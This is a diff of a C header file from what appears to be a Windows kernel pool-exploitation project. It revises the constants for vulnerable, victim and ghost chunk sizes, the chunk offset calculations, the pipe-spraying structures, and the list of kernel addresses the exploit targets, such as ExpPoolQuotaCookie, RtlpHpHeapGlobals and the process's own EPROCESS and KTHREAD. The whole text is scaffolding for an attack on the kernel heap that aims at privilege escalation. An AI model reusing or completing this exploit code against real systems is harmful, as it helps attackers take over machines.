@@ -28,12 +28,12 @@
 #define FILE_OBJECT_OFFSET 0x30
 
 // Pool chunk constants
-#define TARGETED_VULN_SIZE 0x200
-#define TARGETED_VULN_BUFSIZE (TARGETED_VULN_SIZE - sizeof(pipe_queue_entry_t))
-#define GHOST_CHUNK_SIZE 0x360
-#define GHOST_CHUNK_BUFSIZE (GHOST_CHUNK_SIZE - sizeof(pipe_queue_entry_t))
-#define PREV_CHUNK_OFFSET 0x50
-#define NEXT_CHUNK_OFFSET 0x3F0
+#define PIPE_QUEUE_ENTRY_BUFSIZE(block_size) (block_size - sizeof(POOL_HEADER) - sizeof(pipe_queue_entry_t))
+#define VULN_BLOCK_SIZE 0x200
+#define VICTIM_BLOCK_SIZE 0x210
+#define GHOST_BLOCK_SIZE 0x370
+#define PREV_CHUNK_OFFSET (sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) + sizeof(pipe_queue_entry_t))
+#define NEXT_CHUNK_OFFSET ((sizeof(HEAP_VS_CHUNK_HEADER) + VICTIM_BLOCK_SIZE) * 2 - PREV_CHUNK_OFFSET)
 
 // Fake eprocess constants
 #define FAKE_EPROCESS_SIZE 0x800
@@ -116,46 +116,30 @@ typedef struct pipe_pair
     HANDLE read;
 } pipe_pair_t;
 
-typedef struct pipe_spray
+typedef struct pipe_group
 {
     size_t nb;
-    size_t bufsize;
-    char* data_buf;
+    size_t block_size;
     pipe_pair_t pipes[1];
-} pipe_spray_t;
-
-typedef struct lookaside
-{
-    size_t size;
-    pipe_spray_t* first;
-    pipe_spray_t* second;
-    pipe_spray_t* drain;
-    char* buf;
-} lookaside_t;
+} pipe_group_t;
 
 typedef struct exploit_pipes
 {
-    pipe_pair_t* ghost_pipe;
-    pipe_pair_t* previous_pipe;
-    pipe_spray_t* fake_pool_header;
+    pipe_pair_t ghost_chunk_pipe;
+    pipe_pair_t previous_chunk_pipe;
 } exploit_pipes_t;
 
 typedef struct exploit_addresses
 {
-    uintptr_t kernel_base;
-    uintptr_t ExpPoolQuotaCookie;
-    uintptr_t RtlpHpHeapGlobals;
-
-    uintptr_t self_kthread;
-    uintptr_t self_eprocess;
-
     uintptr_t ghost_vs_chunk;
-    uintptr_t vs_sub_segment;
-
     uintptr_t root_pipe_queue_entry;
     uintptr_t root_pipe_attribute;
 
-    uintptr_t fake_eprocess;
+    uintptr_t kernel_base;
+    uintptr_t ExpPoolQuotaCookie;
+    uintptr_t RtlpHpHeapGlobals;
+    uintptr_t self_eprocess;
+    uintptr_t self_kthread;
 } exploit_addresses_t;
 
 #endif // COMMON_H
